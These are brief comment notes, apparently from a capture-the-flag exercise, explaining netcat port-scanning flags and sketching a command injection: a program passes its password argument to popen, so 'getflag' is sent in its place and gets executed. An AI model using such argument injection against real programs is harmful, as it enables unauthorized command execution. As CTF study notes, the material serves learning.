# netcat - read and writes data across network connections uscing TCP or UDP
# -z - port scanning (no data connection or transfering, just report open or running ports)
# -v - verbose

# programm checks the password with argument -> programm echo the password in popen
# -> instead of password send getflag as argument


# function waits for password and hashes it
